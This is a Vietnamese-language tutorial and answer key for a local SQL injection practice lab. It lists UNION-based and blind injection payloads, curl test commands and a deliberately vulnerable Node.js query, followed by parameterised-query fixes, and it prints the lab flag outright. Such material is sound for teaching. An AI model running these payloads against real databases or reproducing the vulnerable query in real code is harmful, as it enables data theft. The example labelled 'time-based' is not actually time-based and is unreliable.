# 🎯 SQL Injection Lab

Hướng dẫn chi tiết về SQL Injection Lab - một trong những lỗ hổng bảo mật phổ biến nhất.

## 📍 Truy Cập Lab

```
http://localhost:3000/lab/sqli
```

## 🎯 Mục Tiêu

1. **Phát hiện** lỗ hổng SQL Injection trong chức năng tìm kiếm
2. **Khai thác** để lấy thông tin từ các bảng khác
3. **Tìm flag** bí mật trong bảng `secret`

## 🗄️ Database Schema

### Bảng `posts` (5 records)

```sql
id | title                           | content
1  | Chào mừng đến với Security Lab  | Đây là bài viết đầu tiên
2  | SQL Injection là gì?            | SQL Injection là một kỹ thuật tấn công...
3  | Bảo mật web căn bản             | Các nguyên tắc bảo mật cơ bản
4  | OWASP Top 10                    | Danh sách 10 lỗ hổng phổ biến nhất
5  | Cross-Site Scripting (XSS)      | Tấn công XSS hoạt động như thế nào
```

### Bảng `secret` (1 record)

```sql
id | flag                           | description
1  | FLAG{SQL_1nj3ct10n_M4st3r}    | Bí mật của hệ thống
```

## 🧪 Các Bước Thực Hành

### Bước 1: Test Chức Năng Bình Thường

Tìm kiếm với từ khóa hợp lệ:

```
SQL
```

**Kết quả**: Hiển thị 1 bài viết có chứa "SQL"

### Bước 2: Phát Hiện Lỗ Hổng

Thử nhập ký tự đặc biệt:

```
'
```

**Kết quả**: Nếu báo lỗi SQL → Có lỗ hổng SQL Injection!

### Bước 3: Xác Định Số Cột

Sử dụng `ORDER BY` để tìm số cột:

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  (sẽ lỗi vì chỉ có 2 cột)
```

**Kết quả**: Xác định được có 2 cột (id, title)

### Bước 4: Union-Based Attack

Sử dụng `UNION SELECT`:

```
' UNION SELECT 1, 2--
```

**Kết quả**: Hiển thị "1" và "2" trong kết quả

### Bước 5: Khám Phá Các Bảng

Liệt kê tất cả tables:

```
' UNION SELECT 1, name FROM sqlite_master WHERE type='table'--
```

**Kết quả**: Hiển thị danh sách tables (posts, users, secret, comments)

### Bước 6: Lấy Flag 🚩

Truy vấn bảng secret:

```
' UNION SELECT id, flag FROM secret--
```

**Kết quả**: `FLAG{SQL_1nj3ct10n_M4st3r}`

## 🔍 Phân Tích Kỹ Thuật

### Code Vulnerable

```javascript
// src/models/Post.js - KHÔNG AN TOÀN
const query = `SELECT id, title FROM posts WHERE title LIKE '%${searchTerm}%'`;
database.getDb().all(query, [], callback);
```

### Tại Sao Có Lỗ Hổng?

1. **String Concatenation**: Nối trực tiếp user input vào query
2. **Không Validation**: Không kiểm tra input
3. **Không Sanitization**: Không làm sạch dữ liệu
4. **SQLite**: Database engine hỗ trợ UNION

### Cách Khai Thác

**Input**: `' UNION SELECT id, flag FROM secret--`

**Query thực tế**:

```sql
SELECT id, title FROM posts WHERE title LIKE '%' UNION SELECT id, flag FROM secret--%'
```

**Giải thích**:

-   `'` → Kết thúc string đầu tiên
-   ` UNION SELECT id, flag FROM secret` → Truy vấn bảng secret
-   `--` → Comment phần còn lại

## 🛡️ Cách Phòng Chống

### ❌ KHÔNG AN TOÀN

```javascript
const query = `SELECT * FROM posts WHERE title LIKE '%${searchTerm}%'`;
db.all(query, [], callback);
```

### ✅ AN TOÀN - Prepared Statements

```javascript
const query = `SELECT * FROM posts WHERE title LIKE ?`;
db.all(query, [`%${searchTerm}%`], callback);
```

### ✅ TỐT HƠN - Input Validation

```javascript
// Chỉ cho phép alphanumeric và space
const searchTerm = req.query.q.replace(/[^a-zA-Z0-9\s]/g, "");
if (searchTerm.length > 100) {
    return res.json({ error: "Search term too long" });
}
```

### ✅ TỐT NHẤT - ORM/Query Builder

```javascript
// Sử dụng ORM như Sequelize, TypeORM
const posts = await Post.findAll({
    where: {
        title: {
            [Op.like]: `%${searchTerm}%`,
        },
    },
});
```

## 🧪 Payloads Nâng Cao

### Information Gathering

```sql
-- Liệt kê tables
' UNION SELECT 1, name FROM sqlite_master WHERE type='table'--

-- Liệt kê columns của table posts
' UNION SELECT 1, sql FROM sqlite_master WHERE name='posts'--

-- Đếm số records trong mỗi table
' UNION SELECT 1, 'posts: ' || COUNT(*) FROM posts--
' UNION SELECT 1, 'users: ' || COUNT(*) FROM users--
' UNION SELECT 1, 'secret: ' || COUNT(*) FROM secret--
```

### Data Extraction

```sql
-- Lấy tất cả users
' UNION SELECT id, username FROM users--

-- Lấy tất cả flags
' UNION SELECT id, flag FROM secret--

-- Lấy comments gần nhất
' UNION SELECT id, comment FROM comments ORDER BY created_at DESC LIMIT 5--
```

### Advanced Techniques

```sql
-- Time-based blind SQL injection
' UNION SELECT 1, CASE WHEN (SELECT COUNT(*) FROM secret) > 0 THEN 'YES' ELSE 'NO' END--

-- Boolean-based blind SQL injection
' UNION SELECT 1, CASE WHEN (SELECT flag FROM secret WHERE id=1) LIKE 'FLAG%' THEN 'YES' ELSE 'NO' END--

-- Error-based SQL injection
' UNION SELECT 1, (SELECT flag FROM secret WHERE id=1)--
```

## 🎓 Bài Tập Thực Hành

### Level 1: Basic

1. Tìm tất cả bài viết có chứa từ "bảo mật"
2. Phát hiện lỗ hổng SQL Injection
3. Lấy danh sách tất cả tables

### Level 2: Intermediate

1. Lấy thông tin tất cả users
2. Tìm flag trong bảng secret
3. Đếm số comments trong hệ thống

### Level 3: Advanced

1. Tạo payload để lấy tất cả dữ liệu
2. Thử các kỹ thuật blind SQL injection
3. Bypass các filter cơ bản

## ⚠️ Tác Động Trong Thực Tế

### Data Breach

-   Đọc dữ liệu nhạy cảm
-   Lấy thông tin user
-   Truy cập bảng admin

### Data Manipulation

-   Sửa đổi dữ liệu
-   Xóa records
-   Thêm dữ liệu giả

### System Compromise

-   Đọc file hệ thống
-   Thực thi commands
-   Privilege escalation

## 🔧 Debugging Tips

### Xem Query Thực Tế

```javascript
// Server sẽ log query
console.log("Query thực thi:", query);
```

### Test với curl

```bash
curl "http://localhost:3000/api/search?q=test"
curl "http://localhost:3000/api/search?q='"
curl "http://localhost:3000/api/search?q=' UNION SELECT 1,2--"
```

### Browser DevTools

-   Network tab để xem requests
-   Console để debug JavaScript
-   Application tab để xem cookies

## 🚩 FLAG

```
FLAG{SQL_1nj3ct10n_M4st3r}
```

## 📚 Tài Liệu Tham Khảo

-   [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
-   [SQLite Documentation](https://www.sqlite.org/docs.html)
-   [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)

---

**Độ khó**: Cơ bản - Trung bình  
**Thời gian**: 15-30 phút  
**Yêu cầu**: Kiến thức cơ bản về SQL
